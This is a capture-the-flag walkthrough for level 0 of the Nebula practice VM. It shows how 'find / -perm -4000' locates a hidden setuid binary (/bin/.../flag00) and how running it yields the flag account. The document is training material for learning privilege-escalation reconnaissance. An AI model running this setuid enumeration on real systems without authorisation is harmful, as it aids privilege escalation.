### [Exploit Education Level 0](https://exploit.education/nebula/level-00   /)

## Challenge
This level requires you to find a Set User ID program that will run as the `flag00` account.You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Alternatively, look at the find man page.  

To access this level, log in as `level00` with the password of `level00`.

## Solution
We have to use find to find a file with setuser id bit set
    
    
``` bash
level00@nebula:~$ find / -perm -4000 2>/dev/null | less 
```
        
lets see what the parameters indicate
        
``` bash
/               it asks find to look for files in root directory
-perm -4000     its is used to display all files with the setuserid set
2>/dev/null     gets rid of all error messages
```

``` bash
level00@nebula:~$ find / -perm -4000 2>/dev/null | less
/bin/.../flag00
/bin/fusermount
/bin/mount
/bin/pis
/bin/ping6
/bin/su
/bin/umount
/sbin/mount.ecryptfs_private
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
```

we can see a file named `flag00`. lets investigate 

``` bash
level00@nebula:/$ cd /bin/.../
level00@nebula:/bin/...$ ls -la
total 8
drwxr-xr-x 2 root   root      29 2011-11-20 21:22 .
drwxr-xr-x 3 root   root    2728 2012-08-18 02:50 ..
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 flag00
```

we can see that the `setuserid` bit is set for `flag00`. lets run it
``` bash
level00@nebula:/bin/...$ ./flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/bin/...$ getflag
You have successfully executed getflag on a target account
```
